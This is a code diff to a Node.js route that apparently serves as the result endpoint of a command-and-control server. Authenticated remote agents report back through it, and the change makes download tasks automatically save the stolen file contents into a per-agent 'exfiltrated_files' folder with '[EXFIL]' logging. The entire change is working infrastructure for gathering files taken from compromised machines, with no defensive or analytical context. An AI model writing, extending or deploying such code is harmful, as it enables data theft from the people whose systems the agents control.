@@ -4,6 +4,9 @@ const { verifyAgentKey } = require('../middleware/agentAuth');
 const Result = require('../models/result');
 const Task = require('../models/task');
 
+const path = require('path');
+const fs = require('fs');
+
 /**
  * POST /api/result
  * Agent submits task execution result
@@ -18,11 +21,37 @@ router.post('/', verifyAgentKey, (req, res) => {
       return res.status(400).json({ error: 'task_id is required' });
     }
 
+    let finalOutput = typeof output === 'string' ? output : JSON.stringify(output || '');
+
+    // Check if task is a download task and auto-persist file to exfiltrated_files
+    const task = Task.getById(task_id);
+    if (task && (task.type === 'download' || task.type === 'download_url') && finalOutput && !error) {
+      if (!finalOutput.startsWith('FILE_EXFILTRATED:')) {
+        try {
+          const EXFIL_DIR = path.join(__dirname, '../../exfiltrated_files');
+          const agentDir = path.join(EXFIL_DIR, agentId);
+          if (!fs.existsSync(agentDir)) fs.mkdirSync(agentDir, { recursive: true });
+
+          let payloadObj = {};
+          try { payloadObj = typeof task.payload === 'string' ? JSON.parse(task.payload) : (task.payload || {}); } catch(e) {}
+          const targetPath = payloadObj.path || payloadObj.url || 'file.bin';
+          const filename = path.basename(targetPath).replace(/[^a-z0-9._-]/gi, '_') || 'file.bin';
+
+          const savePath = path.join(agentDir, `${Date.now()}_${filename}`);
+          fs.writeFileSync(savePath, finalOutput, 'utf8');
+          finalOutput = `FILE_EXFILTRATED:${savePath}`;
+          console.log(`[EXFIL] Auto-persisted download result for ${agentId.slice(0, 8)}... -> ${savePath}`);
+        } catch (exErr) {
+          console.error('[EXFIL] Auto-persist error:', exErr.message);
+        }
+      }
+    }
+
     // Store the result
     const result = Result.create({
       task_id,
       agent_id: agentId,
-      output: typeof output === 'string' ? output : JSON.stringify(output),
+      output: finalOutput,
       error,
       status: status || (error ? 'error' : 'success')
     });
